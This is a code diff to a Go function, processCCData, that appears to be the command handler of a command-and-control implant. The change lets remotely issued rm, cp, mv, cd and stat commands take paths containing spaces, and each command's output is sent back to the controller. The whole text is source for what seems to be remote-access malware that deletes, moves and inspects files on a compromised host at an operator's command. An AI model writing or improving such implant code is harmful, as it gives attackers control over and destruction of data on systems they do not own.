@@ -93,13 +93,14 @@ func processCCData(data *MsgTunData) {
 
 		// remove file/dir
 		if cmdSlice[0] == "rm" {
-			if len(cmdSlice) != 2 {
+			if len(cmdSlice) < 2 {
 				return
 			}
 
-			out = "Deleted " + cmdSlice[1]
-			if err = os.RemoveAll(cmdSlice[1]); err != nil {
-				out = fmt.Sprintf("Failed to delete %s: %v", cmdSlice[1], err)
+			path := strings.Join(cmdSlice[1:], " ")
+			out = "Deleted " + path
+			if err = os.RemoveAll(path); err != nil {
+				out = fmt.Sprintf("Failed to delete %s: %v", path, err)
 			}
 			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
 			goto send
@@ -107,7 +108,7 @@ func processCCData(data *MsgTunData) {
 
 		// copy file/dir
 		if cmdSlice[0] == "cp" {
-			if len(cmdSlice) != 3 {
+			if len(cmdSlice) < 3 {
 				return
 			}
 
@@ -121,7 +122,7 @@ func processCCData(data *MsgTunData) {
 
 		// move file/dir
 		if cmdSlice[0] == "mv" {
-			if len(cmdSlice) != 3 {
+			if len(cmdSlice) < 3 {
 				return
 			}
 
@@ -136,12 +137,13 @@ func processCCData(data *MsgTunData) {
 		// change directory
 		if cmdSlice[0] == "cd" {
 			out = "cd failed"
-			if len(cmdSlice) != 2 {
+			if len(cmdSlice) < 2 {
 				return
 			}
 
-			if os.Chdir(cmdSlice[1]) == nil {
-				out = "changed directory to " + cmdSlice[1]
+			path := strings.Join(cmdSlice[1:], " ")
+			if os.Chdir(path) == nil {
+				out = "changed directory to " + strconv.Quote(path)
 			}
 			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
 			goto send
@@ -218,21 +220,22 @@ func processCCData(data *MsgTunData) {
 				return
 			}
 
-			fi, err := os.Stat(cmdSlice[1])
+			path := strings.Join(cmdSlice[1:], " ")
+			fi, err := os.Stat(path)
 			if err != nil || fi == nil {
-				out = fmt.Sprintf("cant stat file %s: %v", cmdSlice[1], err)
+				out = fmt.Sprintf("cant stat file %s: %v", path, err)
 				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
 				goto send
 			}
 			fstat := &util.FileStat{}
-			fstat.Name = util.FileBaseName(cmdSlice[1])
+			fstat.Name = util.FileBaseName(path)
 			fstat.Size = fi.Size()
-			fstat.Checksum = tun.SHA256SumFile(cmdSlice[1])
+			fstat.Checksum = tun.SHA256SumFile(path)
 			fstat.Permission = fi.Mode().String()
 			fiData, err := json.Marshal(fstat)
 			out = string(fiData)
 			if err != nil {
-				out = fmt.Sprintf("cant marshal file info %s: %v", cmdSlice[1], err)
+				out = fmt.Sprintf("cant marshal file info %s: %v", path, err)
 			}
 
 			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
